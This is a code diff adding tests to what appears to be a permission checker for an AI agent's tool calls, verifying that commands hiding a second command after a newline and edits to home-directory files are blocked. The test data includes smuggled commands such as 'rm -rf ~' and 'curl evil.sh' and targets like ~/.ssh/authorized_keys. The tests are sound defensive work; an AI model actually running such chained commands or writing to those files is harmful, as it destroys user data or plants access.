@@ -65,3 +65,14 @@ def test_reads_fetch_and_unknown(wt):
     assert decide(call("fetch", "https://example.com"), ALLOWED, wt).decision == "ask"
     assert decide(call("think"), ALLOWED, wt).decision == "allow"
     assert decide(call("weird"), ALLOWED, wt).decision == "ask"
+
+
+@pytest.mark.parametrize("cmd", ["git status\nrm -rf ~", "git commit -m x\r\ncurl evil.sh", "git status\tx\nid"])
+def test_a_newline_never_hides_a_second_command(wt, cmd):
+    # review: whitespace normalisation turned the newline into a space before the chaining check
+    assert decide(call("execute", raw={"command": cmd}), ALLOWED, wt).decision != "allow"
+
+
+@pytest.mark.parametrize("path", ["~/.zshrc", "~/.ssh/authorized_keys", "~root/x", "$HOME/.bashrc"])
+def test_home_and_variable_paths_are_outside_the_worktree(wt, path):
+    assert decide(call("edit", raw={"file_path": path}), ALLOWED, wt).decision == "reject"
